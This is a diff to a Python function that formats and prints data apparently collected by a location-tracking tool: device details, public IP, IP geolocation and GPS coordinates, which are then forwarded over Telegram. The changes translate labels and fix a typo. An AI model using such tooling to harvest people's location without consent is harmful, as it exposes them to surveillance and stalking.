@@ -339,13 +339,13 @@ def data_parser():
 		device_info = f'''{Y}[!] Informacion de dispositivo :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
-{G}[+] {C}Platforma   : {W}{var_platform}
-{G}[+] {C}CPU (nucleos)  : {W}{var_cores}
+{G}[+] {C}Platform   : {W}{var_platform}
+{G}[+] {C}CPU cores  : {W}{var_cores}
 {G}[+] {C}RAM        : {W}{var_ram}
 {G}[+] {C}GPU Vendor : {W}{var_vendor}
 {G}[+] {C}GPU        : {W}{var_render}
 {G}[+] {C}Resolution : {W}{var_res}
-{G}[+] {C}Navegador    : {W}{var_browser}
+{G}[+] {C}browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 '''
 		utils.print(device_info)
@@ -369,12 +369,12 @@ def data_parser():
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
-				ip_info = f'''{Y}[!] IP Information :{W}
+				ip_info = f'''{Y}[!] IP Informacion :{W}
 
-{G}[+] {C}Continente : {W}{var_continent}
-{G}[+] {C}Pais   : {W}{var_country}
+{G}[+] {C}Continent : {W}{var_continent}
+{G}[+] {C}Country   : {W}{var_country}
 {G}[+] {C}Region    : {W}{var_region}
-{G}[+] {C}Ciudad      : {W}{var_city}
+{G}[+] {C}City      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
 '''
@@ -390,7 +390,7 @@ def data_parser():
 			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 		else:
 			status = result_json['status']
-			if status == 'succes':
+			if status == 'success':
 				var_lat = result_json['lat']
 				var_lon = result_json['lon']
 				var_acc = result_json['acc']
@@ -407,6 +407,7 @@ def data_parser():
 {G}[+] {C}Altitude  : {W}{var_alt}
 {G}[+] {C}Direction : {W}{var_dir}
 {G}[+] {C}Speed     : {W}{var_spd}
+
 '''
 				utils.print(loc_info)
 				send_telegram(result_json, 'location')
